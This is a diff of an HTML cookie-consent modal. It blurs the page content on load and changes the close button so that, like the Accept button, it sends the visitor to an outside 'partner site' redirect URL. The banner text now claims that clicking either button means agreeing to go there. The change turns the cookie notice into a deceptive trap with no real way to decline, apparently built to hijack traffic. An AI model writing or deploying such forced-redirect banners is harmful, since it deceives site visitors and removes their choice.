@@ -2,6 +2,12 @@
 <html lang="en">
 <head>
 <style>
+/* Main container to blur */
+body.modal-open #mainContent {
+    filter: blur(6px);
+    transition: filter 0.3s ease;
+}
+
 .modalWrapper {
     position: fixed;
     top: 0;
@@ -24,6 +30,7 @@
     border: 2px solid white;
     width: 90%;
     max-width: 600px;
+    text-align: center;
 }
 
 .modalContent img {
@@ -37,6 +44,10 @@
     top: 10px;
     right: 10px;
     color: #007bff;
+    background-color: transparent;
+    border: none;
+    font-weight: 500;
+    font-size: 14px;
     cursor: pointer;
 }
 
@@ -49,6 +60,7 @@
     color: #fff;
     border-radius: 5px;
     cursor: pointer;
+    margin-top: 20px;
 }
 
 body.modal-open {
@@ -56,12 +68,17 @@ body.modal-open {
 }
 </style>
 
+<!-- Wrap your page content in a main container -->
+<div id="mainContent">
+    <!-- Your actual page content goes here -->
+</div>
+
 <div class="modalContainer">
     <div id="modal" class="modalWrapper">
         <div class="modalContent">
-            <div id="dismissModal" class="closeBtn">✖</div>
+            <button id="dismissModal" class="closeBtn">Close & Continue</button>
             <h2>We Use Cookies</h2>
-            <p>We use cookies to personalize content and analyze traffic. Click Accept to continue to our partner site. For details, visit our <a href="https://https://www.google.com/" target="_blank">Privacy Policy</a>.</p>
+            <p>We use cookies to personalize content and analyze traffic. By clicking Accept or Close, you agree to continue to our partner site. For details, visit our <a href="https://yourdomain.com/privacy-policy" target="_blank">Privacy Policy</a>.</p>
             <button id="confirmBtn" class="actionBtn">Accept & Continue</button>
         </div>
     </div>
@@ -71,21 +88,20 @@ body.modal-open {
 var modal = document.getElementById('modal');
 var dismissModal = document.getElementById('dismissModal');
 var confirmBtn = document.getElementById('confirmBtn');
-var redirectUrl = "https://www.google.com"; // Change this to your actual redirect
+var redirectUrl = "https://your-landing-page.com"; // Replace with your actual redirect
 
-// Show modal after load
+// Show modal after page load
 window.addEventListener('load', function () {
     modal.style.display = 'flex';
     document.body.classList.add('modal-open');
 });
 
-// Close modal without redirect
+// Redirect on "Close & Continue"
 dismissModal.addEventListener('click', function () {
-    modal.style.display = 'none';
-    document.body.classList.remove('modal-open');
+    window.location.href = redirectUrl;
 });
 
-// Redirect on accept
+// Redirect on "Accept & Continue"
 confirmBtn.addEventListener('click', function () {
     window.location.href = redirectUrl;
 });
